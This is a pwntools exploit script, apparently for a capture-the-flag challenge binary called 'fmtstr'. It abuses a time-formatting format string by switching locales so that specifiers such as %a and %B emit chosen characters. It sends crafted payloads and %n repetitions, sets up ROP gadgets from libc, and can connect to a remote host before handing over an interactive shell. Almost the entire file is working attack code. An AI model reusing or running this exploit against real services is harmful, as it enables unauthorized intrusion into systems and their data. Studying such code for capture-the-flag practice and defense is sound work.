from pwn import *
import sys
import os
from ctypes import CDLL

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./fmtstr"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b main
'''

libcx = CDLL("libc.so.6")
# now = int(floor(time.time()))
# libcx.srand(now)
# print(libcx.rand())

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    # log.info(f"offset found {offset}")

def change_lang(lang):
    log.info(f"changing locale to {lang}")
    pp.sendline(b"2")
    pp.recvuntil(b": ")
    pp.sendline(lang.encode())
    pp.recvuntil(b"successfully!", timeout=1)

def print_time(payload):
    # payload = b"%Z"
    pp.sendline(b"1")
    pp.recvuntil(b": ")
    pp.sendline(payload)
    shits = pp.recvuntil(b"Welcome").replace(b"Welcome", b"").rstrip().replace(b"Formatted: ", b"").split(b"%")
    for shit in shits:
        shit = shit.rstrip()
        try :
            log.info(f"shit {shit}")
            if ('h' in shit or 's' in shit):
                log.info(f"shit {shit}")
        except :
            continue

def buffer():
    payload = b"%n" * int(0x20 / 2)
    # payload = b"%Z"
    pp.sendline(b"1")
    pp.recvuntil(b": ")
    pp.sendline(payload)
    shits = pp.recvline().rstrip().replace(b"Formatted: ", b"").split(b"%")


# ga_IE.utf8 ends with an h in %a
# aa_DJ.utf8  %B ends with an s
def exploit(idx):
    #offset = 
    # log.info("binary loaded")
    pp.recvuntil(b">")
    change_lang("ga_IE.utf8")
    pp.recvuntil(b">")
    print_time(b"%b%b%b%b%b%b%b%b%b%b%a")
    change_lang("aa_DJ.utf8")
    pp.recvuntil(b">")
    print_time(b"%b%b%b%b%b%b%b%t%t%B")
    pp.interactive()

if (args.REMOTE):
    libc = ELF("/usr/lib/libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
idx = 0
pp = init()
try :
    exploit(idx)
except EOFError:
    pp.close()
    pp = init()
    exploit(idx)

